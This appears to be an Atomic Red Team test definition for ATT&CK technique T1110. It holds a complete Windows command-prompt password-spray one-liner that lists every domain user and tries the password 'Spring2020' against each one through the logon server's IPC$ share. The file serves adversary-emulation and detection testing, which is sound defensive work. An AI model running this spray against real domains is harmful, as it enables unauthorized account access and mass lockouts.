---
attack_technique: T1110
display_name: Brute Force Credential Access

atomic_tests:
- name: Domain Password Spray (Windows FOR Loop)
  auto_generated_guid: 09480053-2f98-4854-be6e-71ae5f672224
  description: |
    This test will attempt to authenticate to a domain controller with the specified password ('Spring2020' by default) for every user in the domain.
    Be careful to not lock out user accounts. Use 'net accounts /domain' to review the domain password lockout policy.
  supported_platforms:
    - windows
  input_arguments:
    password:
      description: Password to attempt for each users
      type: String
      default: Spring2020

  executor: 
    name: command_prompt
    elevation_required: false
    command: |
      rm %temp%\1.txt & rm %temp%\2.txt & rm %temp%\3.txt & rm %temp%\users.txt
      @FOR /F "skip=6 delims=" %a in ('net users /domain ^| findstr /vc:"The command c"') do @set line=%a & @call echo %^line:  =,%  >> %temp%\1.txt
      @FOR /F "delims=" %a in (%temp%\1.txt) do @set line=%a & @call echo %^line:, =,% >> %temp%\2.txt
      @FOR /F "tokens=1-3 delims=," %n in (%temp%\2.txt) do @echo %n >> %temp%\3.txt & @echo %o >> %temp%\3.txt & @echo %p >> %temp%\3.txt
      @FOR /F "tokens=*" %a in ('type %temp%\3.txt ^| findstr /vc:"ECHO is on."') do @echo %a >> %temp%\users.txt
      @FOR /F %n in (%temp%\users.txt) do @net use %logonserver%\IPC$ /user:%userdomain%\%n #{password} 1>NUL 2>&1 & @echo|set/p=.  && @echo [*] %n && @net use /delete %logonserver%\IPC$ > NUL